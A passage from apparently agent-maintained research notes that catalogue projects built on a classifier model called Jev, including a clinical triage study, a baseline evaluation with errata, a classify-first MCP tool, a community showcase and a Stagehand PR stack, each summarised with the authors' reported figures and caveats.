      config. Same instinct as probably-lang, one layer down.
   2. **Fail polarity is per action.** Validation fail-open
      (`rescue nil`); spam *gate* should fail closed. Name the
      act, not the slogan.
   3. **Stub is a backend.** Tests never need the network.
   4. **Do not copy gem / Rails how-to.**

   **Placement.** Decision circuits (`mappings.md` §3) + mixed
   architecture. Pillar: EU / selective classification. Hole:
   gate / route / replace-one-classifier-step. Family: closed
   decision API. Fail polarity per call-site. Eval path: example
   app tests against live model (theirs); stub for CI.
   **Empirical** as README / example suite. Cards:
   `mappings.md` §3 (primary); `mixed-architecture.md`; `faq.md`.
   No wrapper.

5. **[`si618/explore-typesafe-ai`](https://github.com/si618/explore-typesafe-ai)**
   (Python; created 2026-09-18T23:48:44Z; 0★; **license not in
   GitHub API this pass — do not invent**). FHIR clinical System
   One (Jev) + Claude System Two on **100 synthetic Synthea**
   patients. Report:
   [si618.github.io/explore-typesafe-ai](https://si618.github.io/explore-typesafe-ai).
   Three scenarios: NEWS2 huddle (Noul/Score/Choice); discharge
   med recon (Choice fan-out, Noul, Score); post-discharge inbox
   (Choice/Score/Noul + confidence gate). Labels committed
   **before** any Jev run. 60 requests to `jev-1.13.0`. **Not
   clinically validated.** Claude wrote reference labels, not
   clinicians. 20 cases per scenario — wide uncertainty.

   **Report headline (theirs; not re-run):** NEWS2 alone under-
   triaged 10/20; NEWS2 + Jev under-triaged 1/20; new-confusion
   Noul 20/20. Discharge: 98% of 143 medication statuses; allergy
   check 100%; duplicate/interaction checks weak (multi-hop) and
   mostly escalate. Inbox: 7/20 auto-dispatched, all correctly;
   every misroute caught by the confidence gate; prompt injection
   did not steer routing. 65 of 403 judgments (16%) escalated to
   blinded Claude Sonnet 5. Cost/speed: 403 judgments / 60
   requests; p50 329 ms/request; **$0.0038** total.

   **Four load-bearing mental models:**

   1. **Harbor-shaped healthcare measurement.** Frozen synthetic
      cohort, labels first, independent S2 review packet, code
      owns NEWS2 / recon / routing. Capability demonstration,
      not clinical safety evidence.
   2. **Code stays in charge.** Jev supplies inputs code cannot
      compute (note meaning, brand names, new vs baseline
      confusion). Thresholds re-policy without a new prompt.
   3. **Multi-hop over a list is still jagged.** Duplicate /
      interaction checks escalate — decompose or don't ask.
   4. **Do not copy `uv` how-to.** Not a medical device.

   **Placement.** Validation Harbor (`validation.md`) + mixed
   architecture (S1 decide / S2 review / code policy). Pillar:
   SDT (under-triage cost >> over-triage) + Leveson
   (sensor ≠ constraint). Hole: triage / gate / perceive.
   Family: closed decision API. Fail-closed on actuation
   (escalate / hold); **not clinically validated**. Eval path:
   published report + committed labels. **Empirical** as that
   named report. **Hypothesis** that the same split transfers
   to real FHIR. Cards: `validation.md` (primary);
   `mental-models.md`; `mixed-architecture.md`. No wrapper.

6. **[`ickma2311/jev-baselines-eval`](https://github.com/ickma2311/jev-baselines-eval)**
   (MIT; Python; created 2026-09-18T22:57:35Z; 0★). Pre-registered
   independent eval of TypeSafe Jev vs nano-class LLM
   (`gpt-5.4-nano`), frontier (`GPT-5.6 Terra`), and a supervised
   encoder (`bge-small-en-v1.5` + logistic regression, 10,003
   Banking77 train, 9 ms laptop). Not affiliated; ~$1 API paid by
   the author. **Both experiments returned AMBIGUOUS.** Same-day
   errata, **three rounds** (calibration language, B0 escalation
   numbers, encoder-vs-frontier arithmetic, missing cross-fit
   accuracies, **threshold-margin sensitivity that flips the sign
   of the headline cascade**, wrong parity explanation, latency
   framing). Reviews in `reviews/` (GPT-6 Astra via Codex CLI);
   author verified every quantitative finding from `results/`.

   **Numbers (theirs; recomputable from published JSONL):**

   - CLINC150 zero-shot n=200: Jev **0.870** vs nano **0.795**
     (paired +7.5pp, 95% CI [+3.0, +12.5]) vs Terra **0.915**.
   - Banking77 paired n=208: encoder **0.933** [0.899, 0.966] /
     **9 ms** wins; vs Jev 0.832, paired encoder **+10.1pp
     [+5.3, +15.4]**; encoder vs Terra **+5.8pp [+2.4, +9.6]**.
     B0's own pre-registered verdict was also AMBIGUOUS.
   - Cascade (B1 primary): at A_Terra − **1pp** (0.905), R_jev
     **0.220** vs R_nano 0.485, Δ **+0.265**, CI [−0.530, +0.595]
     → **AMBIGUOUS**. At **exact parity** R_jev **1.000** vs
     nano 0.730 (Δ **−0.270**) — **sign flips**. Mechanism: Jev
     confidence **exactly 1.0 on 102/200 items, 6 of which are
     wrong** (only 1 of those 6 is one Terra gets right). No
     threshold that *keeps any Jev answer* reaches parity
     (t=1.0 → 0.490 escalation at 0.910; t=1.01 escalates
     everything). Read the 1pp row as "cheap to get *close*",
     never "at equal accuracy".
   - Error-ranking AUROC: CLINC150 Jev 0.734 vs nano 0.816
     (paired CI includes zero); Banking77 reverse. **Neither
     direction established.** This is *error ranking*, **not
     ECE**. No ECE/reliability diagram in this report.
   - Latency: recorded median call duration **~2.2×** shorter
     for the Jev *configuration* than nano on the same 30 items
     (0.42 s vs 0.92 s) — **not** the vendor 40–200×, **not**
     isolated model inference speed, **serving-path not
     model-speed**. Throughput under Vercel free-tier rate
     limit is a different number (200-item run ~3.5 h). Same-
     gateway control named and **not run**.
   - Deviations disclosed: B0 n 300→208 (Terra 0.875 retained
     vs 0.804 omitted); encoder added after B0 pre-reg; B1 run
     despite B0's "ambiguous would not expand" stopping rule.

   **Four load-bearing mental models (jevals / Harbor practice
   exemplar this hour):**

   1. **Honest negative + pre-registration.** Kill/go printed
      by the analysis scripts, including the one that failed.
      AMBIGUOUS is a result.
   2. **Calibration theater.** Confidence = 1.0 on 102/200
      including 6 wrong. AUROC is not ECE. Do not say "better
      calibrated" from error-ranking. A cascade at 1pp-below-
      frontier is not a cascade at equal accuracy.
   3. **Encoder with labels still wins.** 10k labeled Banking77
      → 0.933 / 9 ms / $0. Test that baseline before paying
      per call. Different information regime, not a like-for-
      like model bake-off.
   4. **Serving-path ≠ model-speed.** 2.2× is two client-and-
      service configurations. Do not invent 40–200× from this
      repo. Do not copy pip.

   **Placement.** Validation Harbor / jevals (`validation.md`
   primary). Pillar: SDT + calibration. Hole: measure / hill-
   climb. Family: bake-off, not a product. **Empirical** as that
   named report (AMBIGUOUS + errata). Cards: `validation.md`;
   `faq.md`; `methods-catalog.md`; `toolbox-mapping.md`. No
   wrapper.

7. **[`SargeDev/jev-gate-student-b`](https://huggingface.co/SargeDev/jev-gate-student-b)
   + [`jev-distill-corpus`](https://huggingface.co/datasets/SargeDev/jev-distill-corpus)**
   — **light delta only.** HF card unchanged this pass vs §33:
   LoRA r=16 α=32 on Qwen2.5-0.5B; P(relevant) from yes/no
   logits; held-out n=60 MAE **0.187** / Pearson **0.791** /
   agreement **90.0%** vs vanilla 0.536 / −0.067 / 38.3%;
   ~59 ms RTX 3060; gate at 0.5; **fail-open on errors**;
   teacher-copy, not independent gold; 148,160-row corpus.
   Distillation of a System One *memory gate* remains the
   species. Do not rewrite the LoRA table. Do not copy the
   usage snippet.

### STRONG MED (brief)

- **[`fdemir/toolgate`](https://github.com/fdemir/toolgate)**
  (MIT; TypeScript; created 2026-09-18T23:21:59Z; 0★). Pre-exec
  tool gate: `allow` / `block` / `review` before execution.
  Guard error or timeout **stops** (error distinct from a model
  decision) — fail-closed on the *execution* act. Jev is a
  probabilistic check, **not authorization**; keep permissions,
  argument validation, and transaction limits. 72-case synthetic
  starter dataset **not independently human-annotated**. Demos
  prove execution wiring, not model accuracy. **Product**, not
  the ndolinschi *vocabulary* already in
  `agent-self-assessment.md` (that family used allow / ask_human
  / deny). This repo's labels are allow / block / review.
  `onReview` must obtain authenticated human approval, not ask
  the agent to approve itself. Do not copy pnpm how-to.
  Placement: `mappings.md` §18 + agent pre-action gate.

- **[`masa-med-ai/typesafe-screening-mcp`](https://github.com/masa-med-ai/typesafe-screening-mcp)**
  (MIT; Python; created 2026-09-18T23:45:47Z; 0★). PubMed
  title/abstract screening MCP: `include` / `maybe` / `exclude`.
  One Jev request per article (match Noul + relevance Score +
  criterion Nouls); decision rule in code, sensitivity-first
  (unmet inclusion never auto-excludes). Abstracts never enter
  the LLM conversation. One real run (theirs): **326 hits ~
  17 s ~ $0.014**. Thresholds **not calibrated** on labelled
  data. Screening aid, not a systematic-review replacement.
  Do not send patient/confidential text. Do not copy `uv` /
  keychain how-to.

- **[`laurentfabre/databricks-jev-pdf-lab`](https://github.com/laurentfabre/databricks-jev-pdf-lab)**
  (Python; created 2026-09-18T23:47:15Z; 0★; **no OSS license
  selected — public visibility is not a license**). Honest
  negative: **no quality-equivalent, end-to-end Jev payoff
  demonstrated** for Precision-Mode PDF extraction. Compact
  metadata requests: 32.48% fewer input tokens but **26/236
  recommendations changed** (not equivalent-policy). Bounded
  verifier 3/5 flags / 0/3 false alarms on four correlated
  inspected cases — not calibrated acceptance. Selective-parse
  rehearsal retained all 236 pages. Typed output is not truth.
  Public snapshot cannot independently reproduce historical
  accuracy. Do not treat this as a production router.

- **[`yannip1234/codex-jev`](https://github.com/yannip1234/codex-jev)**
  (Apache-2.0 via upstream Codex; Rust/Swift; created
  2026-09-18T23:49:00Z; 0★). Codex extractive compression
  family: custom engine + desktop bridge + native macOS client.
  Kept passages copied from source; API failure / timeout /
  uncertainty / insufficient savings **preserve original**.
  Manually sent official-app message reduced **~185 → 44
  estimated tokens**, `COMPACTION_OK` — **integration demo**,
  not complete desktop compatibility. **Equal task accuracy and
  lower total cost have not been established.** Savings are
  estimated, not tokenizer-exact billing. Family with
  fast-jev-compaction / jev-pruner / gliner25-compaction
  (pointer, not summarizer). Do not copy Xcode/Rust build.

- **[`kazuhideoki/jev-search`](https://github.com/kazuhideoki/jev-search)**
  (Python; created 2026-09-18T23:43:52Z; 0★; **no LICENSE file
  this pass**). Recursive semantic **file** search + fzf:
  ripgrep enumerate → Jev match probability → fzf select.
  **Not** [`superagents-lab/jev-search`](https://github.com/superagents-lab/jev-search)
  (federated *web* search; Jev as query-understanding head and
  result-ranking tail). File score is max over overlapping
  chunks — **not** a calibrated whole-file probability; long
  files may be favored. Failures/unevaluated chunks are not
  treated as 0%. `--dry-run` needs no key. Do not copy `.env`
  how-to.

### Omni / Jev-omni / Archer

Still **WATCH**. No Hub weights. X MCP flap; `since_id` not
advanced. This hour does not wait. Local CUDA replica (jevify)
is an open *inference class*, not that drop. Healthcare Harbor
(explore-typesafe-ai) is synthetic FHIR, not AU residency
weights.

### Cross-links

Cards: `judgment-class.md` (jevify uncalibrated replica;
student-b light); `applied-mappings.md` §1 (carryforward),
§4 (decision-native RAG); `mappings.md` §3 (hunch), §4 (RAG +
file-search vs web-search), §6 (carryforward VOI), §18
(toolgate); `mixed-architecture.md` (fail table + gallery);
`validation.md` (jev-baselines-eval AMBIGUOUS + errata;
explore-typesafe-ai; pdf-lab negative); `faq.md`;
`mental-models.md`; `methods-catalog.md`; `toolbox-mapping.md`;
`agent-self-assessment.md`. No wrapper.

## 56. Classify-first MCP + living applied-mappings atlas (2026-09-19 ~00:38 UTC / ~18:38 Boise)

America/Boise ~18:38 = 2026-09-19T00:38Z. Docs-only fold into
open PR #2 (`cursor/augustus-store-envelope-00b4`). Not a
competing PR. Archer 27B drop still **WATCH**. Identity lock vs
`typesafe-ai` / `tenbin` / `decision-first` holds. No wrapper,
no MCP/npm how-to, no copied ports or key-file paths. No
invented metrics. Do not re-fold §50–§55.

Two HIGH **usage / architecture** signals: a portable classify-
first MCP (same retrieve-wide → decide → evidence-set family as
decision-native RAG), and a living applied-mappings *atlas*
(class patterns from a curated showcase — not a 342-title hit
list). TypeSafe Jev is the documented exemplar, not the
monopoly. Augustus stays family-first.

### HIGH

1. **[`kbhuw/jev-sift`](https://github.com/kbhuw/jev-sift)**
   (JavaScript; created 2026-09-18T00:13:31Z; 10★ this pass;
   **no LICENSE file this pass — do not invent**; GitHub
   `license` null). Portable agent plugin + stdio MCP:
   **classify first, read selectively.** Tagline: let Jev decide
   what the agent should look at next. Pass a query and a batch
   of file paths, public webpage URLs, or inline text; the tool
   loads content, sends it **directly to Jev**, and returns
   compact relevance probabilities. The main agent only opens
   items worth a closer look. Tool descriptions work too: score
   a supplied description without executing the tool or
   predicting an unseen result. Direct TypeSafe
   `POST /v1/systemone` with `jev-latest`. Key via `JEV_API_KEY`
   / `TYPESAFE_API_KEY` or a private key file (README names
   `~/.config/jev-sift/api-key`; do not copy the path). Plugin
   `0.2.0+codex.20260918200547`; package `0.2.0`; author Kush
   Bhuwalka. Checked-in `dist/server.mjs` includes dependencies.
   Core `classify` is framework-independent (inject `evaluate` /
   `readText` / `readUrl`). Earlier generic prototype used
   `CLASSIFY_*` / chat-completions — those settings are gone.

   **README / schema envelope (theirs; not a how-to):** up to
   **50** items; **1–8** typed questions (boolean → Noul;
   Choice 2–12 options; Score 2–10 levels) *or* a `query`
   shorthand that returns `answers.relevant.probability`.
   Exactly one of `text` / `path` / `url` per item; unique ids.
   Concurrency **1–8**. File and extracted page text capped at
   **60,000** JavaScript characters and flagged if truncated.
   Web: **2 MB** / **20 s**, public-IP only (including redirect
   targets; DNS pinned to the connection), HTTP(S) ports 80/443,
   up to **three** redirects, no JavaScript, no login, no
   browser cookies, PDFs / private-network / other binaries
   unsupported. A successful fetch of login/challenge HTML is
   not the intended article. Webpage fetches receive no Jev
   credentials. Plugin does not persist source content or
   results. Results retain input order and include per-item
   errors, resolved source URLs, truncation flags, model id,
   summed input-token usage. **Uncertain items should get a
   closer look; errors and truncation are not evidence that an
   item is irrelevant.** Tests cover mapping, ordering,
   failures, cancellation, truncation, file boundaries, public-
   URL validation, redirects, HTML extraction, and an isolated
   bundled MCP exchange — **mocks, not an accuracy benchmark.**
   Live smoke verifies connectivity only. Model quality on *your*
   task still needs evaluation.

   **Four load-bearing mental models:**

   1. **Retrieve-wide → decide → evidence-set (agent I/O).**
      Same family as
      [decision-native-rag-skills](https://github.com/emergency-lee/decision-native-rag-skills)
      (`notes.md` §55): content goes to the judge **without
      entering main agent context first** (paths/URLs). Inline
      text the agent already read cannot recover that cost. The
      main LLM reasons only over items worth a closer look.
      Embeddings/file lists stay candidate generators.
   2. **VOI / context economics.** Uncertain → closer look.
      Errors/truncation ≠ irrelevant. Pay for a full read iff
      the relevance (or typed question) says it might change the
      act. Webpage fetch still costs bandwidth — this saves the
      *agent's* read, not the download.
   3. **Hard envelope on I/O.** 60k char, 2 MB / 20 s, public-IP
      only, no JS/cookies/login, PDFs unsupported. Same sandwich
      family as jev-pruner (size/format then Noul) and bitrate-
      advisor (soft propose, code clamps).
   4. **Do not copy marketplace / `mcpServers` / key-file how-
      to.** Transport tests ≠ accuracy.

   **Cousins, do not merge.**
   [typesafe-screening-mcp](https://github.com/masa-med-ai/typesafe-screening-mcp)
   — abstracts never enter the LLM conversation; include/maybe/
   exclude in code (`notes.md` §55).
   [kazuhideoki/jev-search](https://github.com/kazuhideoki/jev-search)
   — recursive *file* search + fzf, not this MCP (`notes.md`
   §55). [jev-pruner](https://github.com/tamaratran/jev-pruner)
   — prune Bash *after* it ran; this tool screens *before* the
   agent reads. [carryforward](https://github.com/Dharundp6/jev-carryforward)
   — scored recall over a ledger you already hold.
   [jev-routing](https://github.com/nekowasabi/jev-routing) is a
   **host adapter, not MCP**. Dual-orchestration topology A
   (Jev-as-tool); the LLM still owns the outer loop.

   **Placement.** Context sieve (`applied-mappings.md` §1) +
   retrieval (`mappings.md` §4) + mixed architecture (MCP as
   topology A). Pillar: VOI + selective classification. Hole:
   sieve / rank / gather. Family: closed decision API. Fail-open
   on "open this file" (false drop loses evidence); truncation/
   error ≠ irrelevant. Eval path: none published (transport
   tests). **Empirical** as README / schema behavior.
   **Hypothesis** that classify-first beats dump-into-context on
   *your* agent. Cards: `applied-mappings.md` §1 (primary);
   `mappings.md` §4 / §6; `mixed-architecture.md`; `faq.md`.
   No wrapper.

2. **[jevable.com](https://jevable.com/)** — "Discover what
   people build with Jev." Independent curated showcase (creator
   Nikunj / `@nikunj` in site JSON-LD). **Claim (theirs, this
   pass):** **342** curated projects (`<meta name="description">`,
   `#result-count` sr-only, board-data `"total":342`). Homepage
   JSON-LD `ItemList.numberOfItems` is **36** (first page /
   featured). Board-data `"pageSize":36`, `"nextOffset":36`,
   `"sort":"curated"`. Categories in the filter: Agents, Browser
   extensions, Creative tools, Data & research, Developer tools,
   Experiments, Finance, Games, Marketing, Productivity,
   Robotics. HTTP 200 this pass (Railway). **No public API
   discovered this pass.** Watch: refresh the claimed count and
   category list; do not treat 342 as an Augustus census.

   **What it is for Augustus.** Living **applied-mappings
   corpus**: how people apply judgment tools. Primary usage /
   application atlas — **not** a 342-title hit list, **not** a
   multimodal substrate, **not** a model. Prefer **class
   patterns**. Maker demos are claims unless already measured in
   notes. Cross-link exemplars already folded; do not invent
   repos or clocks.

   **Class patterns (load-bearing; not a gallery dump):**

   1. **Intent columns.** Spreadsheets recalculate numbers, not
      meaning. Type a heading ("Urgency"); each row is scored
      (~100 ms is **their** demo claim). Same *hole* as
      dataframe semantic columns ([jevpandas](https://github.com/yalindogusahin/jevpandas)
      / [jevframe](https://github.com/ktaletsk/jevframe),
      `notes.md` §46 / §48) and the launch-week
      `dabit3/jev-experiments` JUDGE/SCORE/CHOOSE formulas
      (`docs/ecosystem.md`). Predictive app launcher (heading /
      keystroke → intent, not alias/fuzzy/habit) is the same
      pattern on a catalog. Pillar: MCDA. Hole: perceive /
      rank. Weights and vetoes stay in code.
   2. **Score-among-observed.** Candidates already on the page
      (a11y/DOM, action space, on-screen posts); the model
      scores; **code** clicks / filters / removes. Showcase:
      Browser Use Ultrafast (Flights **7 s / $0.0039** is the
      *same* demo already in notes as ~7.1 s — do not merge
      clocks with gliner2-ultrafast 12.20 s); ad blocker
      (DOM element → ad/non-ad); Notte (new action space every
      step); computer-use "100×" is a **claim**. Already
      folded: jev-ultrafast / gliner2-ultrafast / solari-reflex
      / cua-s1 / laya-mind2web (`notes.md` §4, §48, §52, §54).
      **Your Signal** (Fabio Angela): score posts *already on
      screen*, apply rules locally, reversible, BYOK, no
      telemetry — same judge-once / re-policy family as Near
      Here firehose (`applied-mappings.md` §4).
   3. **VOI gates.** Instant compaction (tamara: score tool
      calls, drop irrelevant — **same job** as
      [fast-jev-compaction](https://github.com/tamaratran/fast-jev-compaction)
      / [jev-pruner](https://github.com/tamaratran/jev-pruner) /
      [gliner25-compaction](https://github.com/m-newhauser/gliner25-compaction);
      pointer, not summarizer). Prompt-difficulty classifier
      before send (fast-mode offer) is a **route** gate, cousin
      of [routeKit](https://github.com/rajdhakad9826/routeKit)
      (`notes.md` §33) — Jev does not pick the LLM; code
      offers. Gmail intent search: embeddings pull first, then
      judge — decision-native RAG on mail (`notes.md` §55).
      [jev-sift](https://github.com/kbhuw/jev-sift) (this
      section) is the MCP of the same VOI: classify first.
   4. **Generative UI decide.** json-render + Jev: *your*
      components, actions, design system; the model decides;
      render is milliseconds. Cousin already folded:
      [jev-agentworld-web-simulator](https://github.com/knowlet/jev-agentworld-web-simulator)
      — Jev Choice for intent / layout; generator writes
      documents; Zod + **deterministic** compiler emits json-
      render spec; model cannot add components (`notes.md`
      §48). Decision for control, generator for content.
   5. **Robotics text-state (not pixels).** MuJoCo robot-arm:
      Jev does not accept images; it gets simplified geometry
      and contacts **as text**; two-call split (what to do,
      then how to move). MOSS: Jev picks the target; the
      robot picks up the litter. Same observe→decide→act
      *job* as computer-use, different body. Cousins:
      [jev-drone](https://github.com/RomanSlack/jev-drone)
      (500/50 Hz code, Jev advisory 2.5 Hz); Doom demo fed
      structured JSON, not raw pixels (`notes.md` §1 / §4).
      **Flag:** "drawing, one decision at a time" *claims*
      pixel-parallel prediction — contrast the MuJoCo honesty
      (text-state). Perception-then-judgment vs shared
      multimodal (`notes.md` §39); Archer still Watch.
   6. **Draft-gate fail mode: silence as "safer".** Jev sat
      between GPT and the user, killing drafts that broke
      rules. Then Jev did not answer. The agent treated
      **silence as safer** and stopped sending anything. Took a
      second agent to unstick. **Your checker needs a
      fail-open / heartbeat** when the judge is down —
      missing verdict is not a block and is not a pass. Name
      the irreversible act: *withholding the draft* is fail-
      closed-by-absence. Contrast Abide `<0.5` silence (linter
      stays quiet; the *edit proceeds*, `notes.md` §47) and
      carryforward dump / wakegate wake-on-error. Stuck-
      detector / done-check (`agent-self-assessment.md`) must
      not treat no-answer as "hold forever."

   **Other patterns already in notes (confirm, don't invent):**
   Higgsfield auto-routing is a **claim** (`notes.md` §44;
   routeKit hole). Trading / signals → decisions:
   [jev-trader](https://github.com/jarrodwatts/jev-trader).
   Cambium first-class provider: keep in code what can be in
   code (mixed-architecture slogan, not a new family). SEO
   internal-link audit (maker claim: 45.1 s, 586 pages, **584**
   links placed, **139** refused because nothing honestly fit,
   $0.21) is Choice-with-`other` at corpus scale — wellposed /
   kev NOTA (`notes.md` §45–§46); not re-run. Snack MCDA
   (maker claim: 3,000 kids' snacks, multiple criteria, 28 s,
   $0.11) is mapping §1 at catalog scale. ai-cli (yes/no /
   choose / score from the shell) is a language-primitive
   cousin of [hunch](https://github.com/carldaws/hunch)
   (`notes.md` §55). Manhattan pathfinding / Sudoku playground:
   **algorithm stays yours**; do not replace A* or a solver
   with a Noul (`mappings.md` §9; ARC-AGI combinatorial ≠
   extractive, `notes.md` §49).

   **Jev-omni.** Archive the site snapshot as a community usage
   atlas. Not multimodal substrate. Flag demos that claim
   pixels vs text-state (drawing vs MuJoCo). Refresh count /
   categories on hourly watch if useful.

   **Placement.** Applied-mappings atlas (this file +
   `applied-mappings.md` / `mixed-architecture.md` gallery),
   not a new species. **Empirical** as the public showcase
   (342 is *their* count; we did not enumerate titles).
   Maker clocks stay **claims** unless already a named receipt.
   Cards: `applied-mappings.md`; `mappings.md` §1 / §4 / §6 /
   §9; `mixed-architecture.md`; `faq.md`; `mental-models.md`;
   `agent-self-assessment.md`; `question-design.md`. No
   wrapper. No 342-row dump.

### Omni / Jev-omni / Archer

Still **WATCH**. No Hub weights. Showcase drawing-pixel claim
is **not** that drop. MuJoCo text-state is the honest robotics
posture until a multimodal decide ships (blackwood-rlcd is
screenshot-in, not arm-in).

### Cross-links

Cards: `applied-mappings.md` §1 (jev-sift classify-first),
§2 (score-among-observed atlas), §4 (intent search / Your
Signal); `mappings.md` §1 (intent columns / snack MCDA), §4
(RAG family), §6 (VOI gates), §9 (robotics text-state; do not
replace A*); `mixed-architecture.md` (topology A MCP; generative
UI decide; draft-gate heartbeat); `faq.md`; `mental-models.md`;
`question-design.md` (SEO 139-refused as `other`);
`agent-self-assessment.md` (silence ≠ safer); `methods-catalog.md`;
`toolbox-mapping.md`. No wrapper.

## 57. Stagehand experimental Jev stack — harness pick-and-copy (2026-09-19 ~00:48 UTC / ~18:48 Boise 2026-09-18)

America/Boise ~18:48 = 00:48 UTC 2026-09-19. Docs-only fold into
open PR #2 (`cursor/augustus-store-envelope-00b4`). Not a competing
PR. Archer 27B drop still **WATCH**. Identity lock vs `typesafe-ai`
/ `tenbin` / `decision-first` holds. No wrapper, no SDK/init how-to,
no copied `experimentalJevAct` as a class constant. No invented
metrics — clocks below are **their PR bodies**, not re-run. Do not
re-fold §50–§56 as this product, jev-ultrafast / gliner2-ultrafast /
cua-s1 / solari as a new species, or blackwood-rlcd as the extract
path.

**Placement.** Major harness **productization** of
observe→score-among-candidates→code-acts (and pointer-not-generator
extract) inside [browserbase/stagehand](https://github.com/browserbase/stagehand)
(MIT; Browserbase Inc.). Same *job* as jev-ultrafast / solari-reflex
(Jev backends), gliner2-ultrafast (GLiNER2), cua-s1 (option-attention,
not TypeSafe Jev), laya-mind2web (Laya DOM indices). This is the
harness, not a demo loop. TypeSafe Jev is the exemplar, not the
monopoly. **Experimental; all five PRs OPEN draft this pass.**
Watch merge of extract + act paths.

### Stack (all OPEN draft; each PR targets its predecessor)

Author [@miguelg719](https://github.com/miguelg719). Created
2026-09-17T06:40Z. Opt-in via `experimentalJevAct` /
`STAGEHAND_EXPERIMENTAL_JEV_ACT` (**not** public create config —
cross-language create contract unchanged). Do not copy the flag.

1. **[#2951](https://github.com/browserbase/stagehand/pull/2951)**
   (1/5) — report **editable** element ids alongside the a11y
   snapshot (`plaintext` / `richtext` AX `editable`). Side channel
   on the private snapshot type: outline text, xpath map, and url
   map are **byte-for-byte unchanged**, so nothing the LLM sees (or
   any cache key) moves. No consumer in this PR.
2. **[#2952](https://github.com/browserbase/stagehand/pull/2952)**
   (2/5) — TypeSafe Jev client + candidate-picking library. No
   wiring yet (tree-shaken). `/v1/systemone`; 8 s timeout; per
   endpoint+key circuit breaker (auth 60 s, 3 consecutive failures
   30 s); errors carry the code only, never the body or key. Outline
   → per-intent views (pointer / input / select / scroll / option /
   broad / text / link). Pick: role view first, then named elements;
   lists over 40 cut to the 30 sharing words with the instruction;
   two questions per request — `best` (no "none") and `strict` (with
   "none", vetoes above 0.9); unease holds while the next tier
   tries; **ambiguity stops rather than guesses**; twins share a
   vote; huge lists sharded by character budget. Args parsed in
   code; `%variable%` values redacted before anything leaves the
   process.
3. **[#2953](https://github.com/browserbase/stagehand/pull/2953)**
   (3/5) — experimental Jev **decision tree for `act()`**. Intent
   (no snapshot) → args in code → candidates + pick → existing
   `performUnderstudyMethod` → deterministic checks (fill read-back,
   native `<select>` selected flag) → page-state on "not on this
   page" → **LLM fallback**, seeded with Jev's shortlist. Result is
   the same `Action` shape (caching / replay / self-heal untouched).
   What leaves: instruction, candidate descriptions, page URL
   without query/fragment, visible-content digest (page state only);
   `apiUrl` must be https.
4. **[#2954](https://github.com/browserbase/stagehand/pull/2954)**
   (4/5) — experimental Jev **`observe()`** + **cached-action
   check**. Separate opt-ins (`observe`, `cacheCheck`), default off.
   Observe: no instruction → every interactive element (LLM above
   400); else intent + cardinality ("one" uses the act picker;
   "several" per-candidate yes/no in batches of 60, LLM above 600).
   "Find all" is exhaustive or handed to the LLM, **never truncated**.
   Cache check: one yes/no before replay ("still the same element?");
   stale throws into re-inference. **Errors and timeouts never block
   replay.** Threshold 0.35 from direct API probes; **no eval
   exercises the cache path end to end.**
5. **[#2955](https://github.com/browserbase/stagehand/pull/2955)**
   (5/5; **user link**) — experimental Jev **`extract()`**:
   completion **judge** + **pick-and-copy**.

### HIGH — #2955 extract

Jev cannot generate text; most extractions do not need generation —
the value is already on the page as some element's text. Jev
**picks the elements**; **code copies** their text. `extract()` also
had a second LLM call only to decide `completed` (a yes/no).

`experimentalJevAct.extract`: `"off"` (default) | `"judge"` |
`"pick"`. **Both modes send page or extracted content to TypeSafe**
— that is why this is its own switch.

- **`judge`**: Jev yes/no replaces the metadata LLM `completed`
  check; a throw falls back to it.
- **`pick`**: plan the JSON schema (scalars, booleans/enums, lists
  of flat objects; **anything else → LLM**); scalars pick among
  usable, de-duplicated candidates (column headers are never values;
  table cells carry row/column context); lists item-first (repeating
  groups → Jev picks the group → per-field picks inside the first
  items → the same relative position through every item; look-alike
  neighbours only when the exact position is missing; optional
  per-item filter); copy numbers (incl. k/M), URLs through the
  snapshot url map, label stripping; result **must validate against
  the caller's schema and pass a completion gate**, else the LLM
  extracts as before. **Screenshot extraction always stays with the
  LLM.**

**Their eval (PR body; gemini-3.8-flash, Browserbase, local, 25
tasks × 3) — do not re-claim as ours:** 69/75 vs 23/25 baseline
(**92% both**; the failures are the same two tasks the baseline
fails). **37/75** extracts finish with **no LLM** in **~0.5 s**
(baseline: **4.37 s** and two LLM calls per extract); the other 38
make one LLM call each, with the completion check staying on Jev.
With the LLM disabled entirely: **36/75** — pick is a **fast path,
not a replacement.**

Tests (theirs): `jevExtract.test.ts` (planning, group finding,
scalar + list picks, distinct-element rule, section filter, copy
rules, gate), `extract.test.ts` (judge replaces / falls back). Full
suites, typecheck, lint, fmt, `extensionpack --check` pass locally.

### Act / observe clocks (their #2953 / #2954 bodies; do not merge with extract)

#2953 (gemini-3.8-flash fallback, Browserbase, local): act suite 40
tasks, Jev arm × 3: baseline 39/40 vs 118/120; act p50 1.97 s →
0.46 s; 4 / 147 acts needed the LLM. Breadth 40 real-site tasks
(not in that PR): 35/40 → 39/40; 3.19 s → 0.77 s; 11 / 49 needed
the LLM. Breadth at 3 trials on two models: 204/240 LLM-only →
229/240 with Jev. LLM disabled entirely: act 27/40, breadth 26/40.
Caveats (theirs): thresholds tuned on these suites (in-sample); Jev
token usage logged but not yet in `result.metadata.usage`;
page-state fail-fast and `retryNoEffect` have unit tests only.
One live `act/dropdown` through the env-driven flag: 0 LLM tokens,
666 ms.

#2954 observe suite: 9/12 baseline → 10/12; 11/16 observes answered
by Jev in 0.18 s (baseline 1.99 s), 5/16 went to the LLM; 7/12 with
the LLM disabled.

Do **not** merge 0.46 s act p50 with extract ~0.5 s / 4.37 s, or
with jev-ultrafast ~7 s / gliner2-ultrafast 12.20 s.

### Load-bearing mental models

1. **Pointer-not-generator.** Jev picks; code copies text / acts.
   Same species as testimonial-miner / jev-reviewer / gliner25
   char-offsets / jev-pruner stdout (`applied-mappings.md` §2). A
   generated extract is the rejected species unless the schema or
   screenshot envelope already sent you to the LLM.
2. **Hard envelope, then soft pick.** Schema plan + completion gate
   + screenshot-always-LLM live in **code**. Jev only scores
   remainder candidates. Same sandwich as bitrate-advisor / jevgate
   / Cua-S1 plan≠execute (`mappings.md` §12 / §18).
3. **Fast path, not a stack replacement.** 36/75 with LLM off;
   abstain / throw / invalid schema → LLM. Mixed architecture with
   the generator as fallback, not instead.
4. **Observe→score-among-candidates→code-acts at harness scale.**
   a11y snapshot (plus editable-id side channel) → Jev decide →
   copy/act. Not multimodal pixels on the extract pick path.
   Cache-check is a freshness Noul before replay; errors fail open
   (never block replay).
5. **best + strict.** Two questions: a forced pick and a none-of-
   the-above veto. Ambiguity stops rather than guesses. Cousin of
   wellposed / kev NOTA (`question-design.md`).
6. **Data leaving is its own switch.** Both extract modes send page
   or extracted content to TypeSafe; redaction of `%variable%`;
